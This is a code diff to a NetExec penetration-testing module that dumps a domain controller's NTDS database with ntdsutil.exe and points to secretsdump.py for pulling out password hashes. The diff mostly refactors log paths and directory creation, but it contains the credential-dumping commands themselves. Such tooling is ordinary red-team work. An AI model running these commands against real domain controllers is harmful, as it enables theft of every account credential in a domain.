@@ -3,6 +3,7 @@ import socket
 import time
 import subprocess
 
+from nxc.paths import NXC_PATH
 from impacket.examples.secretsdump import LocalOperations, NTDSHashes
 
 from nxc.helpers.logger import highlight
@@ -39,10 +40,7 @@ class NXCModule:
             self.dir_result = os.path.abspath(module_options["DIR_RESULT"])
             self.no_delete = True
         else:
-            timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
-            self.dir_result = os.path.join(
-                os.environ["HOME"], ".nxc", "logs", "ntds", f"ntdsutil_{timestamp}"
-            )
+            self.dir_result = None
             self.no_delete = True
 
     def on_admin_login(self, context, connection):
@@ -66,9 +64,7 @@ class NXCModule:
             hostname = get_hostname(connection)
 
         command = f"powershell \"ntdsutil.exe 'ac i ntds' 'ifm' 'create full {self.tmp_dir}{self.dump_location}' q q\""
-        context.log.display(
-            f"Dumping ntds with ntdsutil.exe to {self.tmp_dir}{self.dump_location}"
-        )
+        context.log.display(f"Dumping ntds with ntdsutil.exe to {self.tmp_dir}{self.dump_location}")
         context.log.highlight("Dumping the NTDS, this could take a while so go grab a redbull...")
         context.log.debug(f"Executing command {command}")
         p = connection.execute(command, True)
@@ -79,22 +75,16 @@ class NXCModule:
             context.log.fail("Error while dumping NTDS")
             return
 
-        os.makedirs(self.dir_result, exist_ok=True)
-        os.makedirs(os.path.join(self.dir_result, "Active Directory"), exist_ok=True)
-        os.makedirs(os.path.join(self.dir_result, "registry"), exist_ok=True)
-
         # use hostname and ip in log paths
-        dir_result_with_host = os.path.join(
-            os.environ["HOME"],
-            ".nxc",
-            "logs",
-            "ntds",
-            f"ntdsutil_{hostname}_{ip}_{time.strftime('%Y-%m-%d_%H-%M-%S')}",
-        )
+        dir_result_with_host = os.path.join(NXC_PATH, "logs", "ntds", f"ntdsutil_{hostname}_{ip}_{time.strftime('%Y-%m-%d_%H-%M-%S')}")
 
         if not self.user_specified_dir:
-            # override dir_result to include hostname and ip
             self.dir_result = dir_result_with_host
+            os.makedirs(self.dir_result, exist_ok=True)
+            os.makedirs(os.path.join(self.dir_result, "Active Directory"), exist_ok=True)
+            os.makedirs(os.path.join(self.dir_result, "registry"), exist_ok=True)
+        else:
+            # if user specified dir_result, create dirs here if needed
             os.makedirs(self.dir_result, exist_ok=True)
             os.makedirs(os.path.join(self.dir_result, "Active Directory"), exist_ok=True)
             os.makedirs(os.path.join(self.dir_result, "registry"), exist_ok=True)
@@ -214,9 +204,7 @@ class NXCModule:
 
         if self.user_specified_dir:
             context.log.display(f"Raw NTDS dump copied to {self.dir_result}, parse it with:")
-            context.log.display(
-                f"secretsdump.py -system '{self.dir_result}/registry/SYSTEM' -security '{self.dir_result}/registry/SECURITY' -ntds '{self.dir_result}/Active Directory/ntds.dit' LOCAL"
-            )
+            context.log.display(f"secretsdump.py -system '{self.dir_result}/registry/SYSTEM' -security '{self.dir_result}/registry/SECURITY' -ntds '{self.dir_result}/Active Directory/ntds.dit' LOCAL")
         else:
             base_dir = os.path.join(os.environ["HOME"], ".nxc", "logs", "ntds")
 
